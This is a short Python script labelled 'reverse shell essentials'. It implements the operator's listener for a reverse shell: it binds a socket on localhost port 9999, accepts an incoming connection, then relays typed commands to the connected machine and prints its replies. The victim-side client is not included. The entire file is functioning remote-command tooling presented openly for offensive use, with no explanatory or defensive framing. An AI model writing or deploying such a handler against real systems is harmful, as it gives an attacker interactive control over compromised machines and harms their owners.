import socket
import sys
## reverse shell essentials


def create_socket():
	try:
		global host
		global port
		global s
		host = "localhost"
		port = 9999
		s = socket.socket()
	except socket.error as msg:
		print("Error creating socket..."+ str(msg))
def socket_bind():
	try:
		global host
		global port
		global s
		print("Waiting for connection...")
		s.bind((host,port))
		s.listen(5)
	except socket.error as msg:
		print("Error binding socket..." + str(msg))

def socket_accept():
	conn , address = s.accept()
	print("Connection established with IP: "+ address[0])
	send_commands(conn)
	conn.close()


def send_commands(conn):
	while True:
		cmd = input()
		if cmd == 'quit':
			conn.close()
			s.close()
			sys.exit()
		if len(str.encode(cmd))>0:
			conn.send(str.encode(cmd))
			client_response = str(conn.recv(1024),"utf8")
			print(client_response , end = "")

def main():
	create_socket()
	socket_bind()
	socket_accept()
main()